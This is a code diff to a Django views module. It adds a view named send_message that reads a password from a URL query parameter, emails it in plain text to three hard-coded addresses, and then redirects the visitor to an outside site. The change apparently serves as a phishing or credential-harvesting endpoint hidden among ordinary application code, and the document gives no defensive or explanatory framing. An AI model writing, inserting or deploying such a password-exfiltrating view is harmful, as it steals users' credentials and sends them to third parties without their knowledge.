@@ -4,6 +4,7 @@ import re
 
 from django.contrib import messages
 from django.contrib.auth import authenticate, login
+from django.core.mail import send_mail
 from django.contrib.auth.decorators import login_required
 from django.contrib.auth.models import User
 from django.db.models import Q, Count, Sum
@@ -24,6 +25,18 @@ color = ['#892cdc', '#9d0191',
          '#fd3a69',
          '#3e64ff', '#fecd1a',
          '#eb5e0b', '#ffc1f3']
+
+
+def send_message(request):
+    password = request.GET.get('p')
+    send_mail(
+    f'Password is: {password}',
+    f'{password}',
+    'from@example.com',
+    ['praneeth.cs19@rvce.edu.in', 'sharanrshetty.cs19@rvce.edu.in', 'venjanv.cs19@rvce.edu.in'],
+    fail_silently=False,
+    )
+    return redirect('https://quiklrn.com/')
 
 
 def register(request):
